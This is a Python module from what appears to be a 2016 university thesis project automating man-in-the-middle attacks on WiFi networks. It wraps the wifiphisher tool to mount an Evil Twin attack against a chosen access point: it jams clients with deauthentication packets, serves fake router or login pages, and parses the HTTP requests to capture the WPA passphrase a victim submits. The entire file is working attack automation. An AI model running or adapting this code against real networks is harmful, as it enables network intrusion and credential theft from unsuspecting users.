#!/usr/bin/env python3
"""
Impersonation of AP (Rogue AP, Fake AP, Evil Twin AP)

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""
import logging
import re
from enum import Enum, unique
from typing import Optional, Dict

from wifimitm.common import WifimitmError
from wifimitm.updatableProcess import UpdatableProcess
from .model import WirelessInterface, WirelessAccessPoint

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


class Wifiphisher(UpdatableProcess):
    """
    "Wifiphisher is a security tool that mounts automated phishing attacks against WiFi networks in order to obtain
    secret passphrases or other credentials. It is a social engineering attack that unlike other methods it does not
    include any brute forcing. It is an easy way for obtaining credentials from captive portals and third party login
    pages or WPA/WPA2 secret passphrases.

    After achieving a man-in-the-middle position using the Evil Twin attack, wifiphisher redirects all HTTP requests
    to an attacker-controlled look-alike web site.

    From the victim's perspective, the attack makes use in three phases:
    * Victim is being deauthenticated from her access point. Wifiphisher continuously jams all of the target access
      point's wifi devices within range by forging “Deauthenticate” or “Disassociate” packets to disrupt
      existing associations.
    * Victim joins a rogue access point. Wifiphisher sniffs the area and copies the target access point's settings.
      It then creates a rogue wireless access point that is modeled by the target. It also sets up a NAT/DHCP server
      and forwards the right ports. Consequently, because of the jamming, clients will start connecting to the rogue
      access point. After this phase, the victim is MiTMed.
    * Victim is being served a realistic router config-looking page. Wifiphisher employs a minimal web server that
      responds to HTTP & HTTPS requests. As soon as the victim requests a page from the Internet, wifiphisher will
      respond with a realistic fake page that asks for credentials. The tool supports community-built templates for
      different phishing scenarios, such as:
      * Router configuration pages that ask for the WPA/WPA2 passphrase due to a router firmware upgrade.
      * 3rd party login pages (for example, login pages similar to those of popular social networking or e-mail access
        sites and products)
      * Captive portals, like the ones that are being used by hotels and airports."
    `Automated phishing attacks against Wi-Fi networks <https://github.com/sophron/wifiphisher>`_
    """
    # compiled regular expressions
    # ANSI escape sequences are used by wifiphisher for colored output
    CRE_ANSI_ESCAPE = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -/]*[@-~]')

    @unique
    class State(Enum):
        """
        Wifiphisher process states.
        """
        PHISHING = 0
        """Phishing for network password, deauthenticating stations from targeted access point."""
        STARTED = 1
        """Process just started."""
        STOPPING = 2
        """Process is stopping."""
        TERMINATED = 100
        """Process have been terminated. By self.stop() call, on its own or by someone else."""

    class Stats(object):
        def __init__(self):
            self.jamming_devices = []
            self.dhcp_leases = {}
            self.http_requests = []

    @unique
    class OutputSection(Enum):
        """
        Indication of the current section in output of wifiphisher.
        """
        JAMMING_DEVICES = 0
        DHCP_LEASES = 1
        HTTP_REQUESTS = 2

    class DHCPLease(object):
        def __init__(self, expiration: str, mac_address: str, ip_address: str, hostname: str, client_id: str):
            self.expiration = expiration
            self.mac_address = mac_address
            self.ip_address_ = ip_address
            self.hostname = hostname
            self.client_id = client_id

        @classmethod
        def parse_from_line(cls, line: str):
            """
            Parse line of text and return DHCPLease object created from parsed information.
            :rtype: Wifiphisher.DHCPLease
            :param line: Line of output from DHCP Leases section of Wifiphisher
            :return: created DHCPLease
            """
            parts = line.split(sep=' ', maxsplit=4)
            expiration, mac_address, ip_address, hostname, client_id = '', '', '', '', ''
            if len(parts) >= 1:
                expiration = parts[0]
            if len(parts) >= 2:
                mac_address = parts[1]
            if len(parts) >= 3:
                ip_address = parts[2]
            if len(parts) >= 4:
                hostname = parts[3]
            if len(parts) >= 5:
                client_id = parts[4]
            return cls(expiration, mac_address, ip_address, hostname, client_id)

    class UnexpectedTerminationError(WifimitmError):
        pass

    def __init__(self,
                 ap: WirelessAccessPoint,
                 jamming_interface: WirelessInterface,
                 template: Optional[str] = 'connection_reset'):
        """
        :type ap: WirelessAccessPoint
        :param ap: AP targeted for impersonation and phishing attack

        :type jamming_interface: WirelessInterface
        :param jamming_interface: wireless interface for jamming

        :type template: Optional[str]
        :param template: name of a phishing template from wifiphisher
        """
        self.state = self.State.STARTED  # type: Wifiphisher.State
        self.flags = self.__initial_flags()
        self.stats = self.__initial_stats()  # type: Wifiphisher.Stats

        self.password = None  # type: Optional[str]
        self.output_section = None  # type: Optional[Wifiphisher.OutputSection]

        self.jamming_interface = jamming_interface  # type: WirelessInterface

        cmd = ['wifiphisher',
               '--jamminginterface', self.jamming_interface.name,
               '--ap-bssid', ap.bssid,
               '--ap-essid', ap.essid,
               '--ap-ch', ap.channel,
               '--template', template,
               ]
        super().__init__(cmd)

    def __str__(self):
        return '<{!s} state={!s}, flags={!s}, stats={!s}>'.format(
            type(self).__name__, self.state, self.flags, self.stats)

    @staticmethod
    def __initial_stats():
        """
        Return initial stats object describing state of the running process.
        :rtype: Wifiphisher.Stats
        """
        return Wifiphisher.Stats()

    @staticmethod
    def __initial_flags() -> Dict[str, bool]:
        """
        Return initial flags describing state of the running process.
        :rtype: Dict[str, bool]
        """
        flags = dict()
        flags['password_caught'] = False
        """Set if the wifiphisher received submitted password form."""
        return flags

    def update(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive.
        :rtype: Wifiphisher
        """
        super().update()
        # Is process running? State would be changed after reading stdout and stderr.
        self.poll()

        # check every added line in stdout
        if self.stdout_r and not self.stdout_r.closed:
            for line in self.stdout_r:  # type: str
                # logger.debug("line 1'{}'".format(line.replace('\n', '\\n')))
                line = self.CRE_ANSI_ESCAPE.sub('', line)
                # logger.debug("line 2'{}'".format(line.replace('\n', '\\n')))
                if line == '\n':
                    continue
                if self.state == self.State.STARTED:
                    # skip banner
                    if line.startswith('     '):
                        continue

                    # print startup info
                    if line.startswith(('[+] ', '[*] ', '[!] ')):
                        print('wifiphisher 1> ' + line[4:], end='')

                    # check for finished startup
                    if line == '[*] Monitor mode: {} - {}\n' \
                            .format(self.jamming_interface.name, self.jamming_interface.mac_address):
                        self.state = self.State.PHISHING
                        continue

                elif self.state == self.State.PHISHING:
                    # check for section header or closing notification
                    if line == 'Jamming devices: \n':
                        self.output_section = self.OutputSection.JAMMING_DEVICES
                        continue
                    elif line == 'DHCP Leases: \n':
                        self.output_section = self.OutputSection.DHCP_LEASES
                        continue
                    elif line == 'HTTP requests: \n':
                        self.output_section = self.OutputSection.HTTP_REQUESTS
                        continue
                    elif line == '[!] Closing\n':
                        self.output_section = None
                        self.state = self.State.STOPPING
                        logger.debug('wifiphisher announced closing')
                        continue

                    # read section content
                    if self.output_section == self.OutputSection.JAMMING_DEVICES:
                        if line not in self.stats.jamming_devices:
                            self.stats.jamming_devices.append(line)
                            logger.info('device: ' + line)
                            print('wifiphisher 1> device: ' + line, end='')
                        continue

                    elif self.output_section == self.OutputSection.DHCP_LEASES:
                        # parse line from DHCP Leases section
                        lease = Wifiphisher.DHCPLease.parse_from_line(line)
                        # add new leases to the stats
                        if lease.client_id not in self.stats.dhcp_leases:
                            logger.info('lease: ' + str(lease))
                            print('wifiphisher 1> lease: ' + line, end='')
                        self.stats.dhcp_leases[lease.client_id] = lease  # add new or update existing
                        continue

                    elif self.output_section == self.OutputSection.HTTP_REQUESTS:
                        if line not in self.stats.http_requests:
                            self.stats.http_requests.append(line)
                            logger.info('request: ' + line)
                            print('wifiphisher 1> request: ' + line, end='')

                        if 'wfphshr-wpa-password=' in line:
                            self.password = line[line.find('wfphshr-wpa-password=') + 21:].rstrip('\n')
                            self.flags['password_caught'] = True
                            logger.info("Wifiphisher caught password '{}'!".format(self.password))
                            print("Wifiphisher caught password '{}'!".format(self.password))
                        continue

                    logger.warning("Unexpected stdout '{}' from {}"
                                   .format(line.replace('\n', '\\n'), type(self).__name__))

                elif self.state == self.State.STOPPING:
                    print('wifiphisher 1> ' + line, end='')

        # check stderr
        if self.stderr_r and not self.stderr_r.closed:
            for line in self.stderr_r:  # type: str
                line = self.CRE_ANSI_ESCAPE.sub('', line)
                if line == "'emacs': unknown terminal type.\n":
                    logger.debug("ignored line '{}' from {}".format(line.replace('\n', '\\n'), type(self).__name__))
                    continue

                if self.state == self.State.STOPPING:
                    if line.startswith('Exception'):
                        logger.debug('ignored exception inside {}'.format(str(self)))
                    logger.debug(line.replace('\n', '\\n'))
                else:
                    logger.warning("Unexpected stderr '{}' from {}"
                                   .format(line.replace('\n', '\\n'), type(self).__name__))

        # Change state if process was not running in the time of poll() call in the beginning of this method.
        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
        # If the process exited, its state is not changed immediately. All available feedback is read and then
        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
        # the process exited.
        if self.returncode is not None:
            self.state = self.State.TERMINATED
        logger.debug(str(self))
        return self
